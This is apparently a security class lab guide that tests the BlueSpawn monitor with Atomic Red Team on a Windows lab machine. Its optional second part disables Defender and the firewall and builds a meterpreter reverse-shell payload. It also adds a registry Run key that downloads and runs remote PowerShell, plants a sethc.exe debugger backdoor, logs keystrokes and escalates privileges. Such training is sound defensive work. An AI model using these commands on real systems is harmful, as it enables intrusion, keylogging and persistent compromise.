

# Atomic Red Team And Bluespawn

In this lab we will be using Bluespawn as a stand-in for an EDR system.  Normally full EDRs like Cylance and Crowdstrike are very expensive and tend not to show up in classes like this.  However, the folks at University of Virginia have done an outstanding job with BlueSpawn. 

BlueSpawn will monitor the system for "weird" behavior and note it when it occurs. For the money, it is great.

In this lab, we will be starting BlueSpawn and then running Atomic Red Team to trigger a lot of alerts.

First, let’s disable Defender. Simply run the following from an Administrator PowerShell prompt:

`Set-MpPreference -DisableRealtimeMonitoring $true`

This will disable Defender for this session.

If you get angry red errors, that is Ok, it means Defender is not running.


Now, let's open a command Prompt:

 

Simply click the Windows Start button in the lower left of your screen and type: 


`Command Prompt` 

 
Next, let’s change directories to tools and start Bluespawn:
C:\Users\adhd>`cd \IntroLabs`

C:\IntroLabs>`BLUESPAWN-client-x64.exe --monitor --level Cursory`


![](attachments/Clipboard_2020-06-16-09-46-00.png)

Now, let’s use Atomic Red Team to test the monitoring with BlueSpawn:

First, we need to open a PowerShell Prompt:

![](attachments/Clipboard_2020-06-16-09-55-12.png)

Lets install and update Atomic Red Team

PS C:\Users\adhd> `cd \`

PS C:\Users\adhd>`IEX (IWR 'https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/install-atomicredteam.ps1' -UseBasicParsing);
Install-AtomicRedTeam -getAtomics -Force`

Please note this can take a bit.

Next, in the PowerShell Window we need to navigate to the Atomic Red Team directory and import the powershell modules:

PS C:\Users\adhd> `cd C:\AtomicRedTeam\invoke-atomicredteam\`

Then, install the proper yaml modules

PS C:\Users\adhd> `Install-Module -Name powershell-yaml`

PS C:\AtomicRedTeam\invoke-atomicredteam> `Import-Module .\Invoke-AtomicRedTeam.psm1`


Now, we need to invoke all the Atomic Tests.

Special note...  Don't do this in production...  Ever.  Always run tools like Atomic Red Team on test systems.  We recommend that you run in on a system with your EDR/Endpoint protection in non-blocking/alerting mode.  This is so you can see what the protection would have done, but it will allow the tests to finish so we are just going to run individual tests for now.

PS C:\AtomicRedTeam\invoke-atomicredteam> `Invoke-AtomicTest T1547.004`

PS C:\AtomicRedTeam\invoke-atomicredteam> `Invoke-AtomicTest T1543.003`

PS C:\AtomicRedTeam\invoke-atomicredteam> `Invoke-AtomicTest T1547.001`

PS C:\AtomicRedTeam\invoke-atomicredteam> `Invoke-AtomicTest T1546.008`


If you get any “file exists” questions or errors, just select Yes.

It should look like this:

![](attachments/Clipboard_2020-06-16-09-48-18.png)

Please note, there will be some errors when this runs.  This is normal.

Please note we had to cross reference the old numbering witgh the new.

You can find that mapping here:

https://attack.mitre.org/docs/subtechniques/subtechniques-crosswalk.json


You should be getting a lot of alerts with Bluespawn Switch tabs in your Terminal to see them:

![](attachments/Clipboard_2020-06-16-09-47-26.png)



# If you have more time

Let’s begin by disabling **Defender**. Simply run the following from an **Administrator PowerShell** prompt:

![](attachments/OpeningPowershell.png)

Next, run the following command in the **Powershell** terminal:

<pre>Set-MpPreference -DisableRealtimeMonitoring $true</pre>

![](attachments/applocker_disabledefender.png)
This will disable **Defender** for this session.

If you get angry red errors, that is **Ok**, it means **Defender** is not running.

Next, lets ensure the firewall is disabled. In a Windows Command Prompt.

<pre> netsh advfirewall set allprofiles state off</pre>


Next, set a password for the Administrator account that you can remember

<pre>net user Administrator password1234</pre>

Please note, that is a very bad password.  Come up with something better. But, please remember it.

Before we move on from our Powershell window, lets get our IP by running the following command:

<pre>ipconfig</pre>

![](attachments/powershellipconfig.png)

**REMEMBER - YOUR IP WILL BE DIFFERENT**

Write this IP down so we can use it again later.

Let's continue by opening a **Kali** terminal

![](attachments/OpeningKaliInstance.png)

Alternatively, you can click on the **Kali** icon in the taskbar.

![](attachments/TaskbarKaliIcon.png)


We need to run the following commands in order to mount our remote system to the correct directory:

<pre>sudo su -</pre>

<pre>mount -t cifs //[Your IP Address]/c$ /mnt/windows-share -o username=Administrator,password=password1234</pre>

**REMEMBER - YOUR IP ADDRESS AND PASSWORD WILL BE DIFFERENT.**

If you see the following error, it means that the device is already mounted.

![](attachments/mounterror.png)

If this is the case, ignore it.

Run the following command to navigate into the mounted directory:

<pre>cd /mnt/windows-share</pre>

Before we run the next commands, we need to get the IP of our Kali System (AKA our Linux IP Adress). Lets do so by running the following:

<pre>ifconfig</pre>

![](attachments/ifconfig.png)

**REMEMBER: YOUR IP WILL BE DIFFERENT**

Run the following commands to start a simple backdoor and backdoor listener: 

<pre>msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp lhost=[Your Linux IP Address] lport=4444 -f exe -o /mnt/windows-share/TrustMe.exe</pre>

Let's start the **Metasploit** Handler.  Open a new **Kali** terminal by clicking the **Kali** icon in the taskbar.

![](attachments/TaskbarKaliIcon.png)

Let's become root.

<pre>sudo su -</pre>

Now let's start the **Metasploit** Handler

<pre>msfconsole -q</pre>

We are going to run the following commands to correctly set the parameters:

<pre>use exploit/multi/handler</pre>

<pre>set PAYLOAD windows/meterpreter/reverse_tcp</pre>

<pre>set LHOST [Your Linux IP Address]</pre>

Remember, **Your IP will be different!**

<pre>exploit</pre>

It should look like this:

![](attachments/msfconsole.png)

We will need to open a **"cmd.exe"** terminal as **Administrator**.

![](attachments/OpeningWindowsCommandPrompt.png)

<pre>cd \IntroLabs</pre>

<pre>Sysmon64.exe -accepteula -i sysmonconfig-export.xml</pre>

It should look like this:

![](attachments/sysmonexe.png)

let's run the following commands to run the **"TrustMe.exe"** file.

<pre>cd \</pre>
 
Then run it with the following:

 <pre>TrustMe.exe</pre>

Back at your Kali terminal, you should have a metasploit session!

![](attachments/meterpretersession.png)


Run commands

meterpreter > `keyscan_start`

meterpreter > `keyscan_dump`

![](attachments/Clipboard_2020-06-15-13-52-00.png)



meterpreter > `shell`

C:\> `reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Payload /d "powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://172.20.243.5:80/a'))\"" /f`

C:\>  `reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "c:\windows\system32\cmd.exe"`

![](attachments/Clipboard_2020-06-15-14-00-53.png)



meterpreter >`getsystem`

![](attachments/Clipboard_2020-06-15-13-52-28.png)


![](attachments/Clipboard_2020-06-15-13-56-34.png)

[Return To Lab List](https://github.com/strandjs/IntroLabs/blob/master/IntroClassFiles/navigation.md)






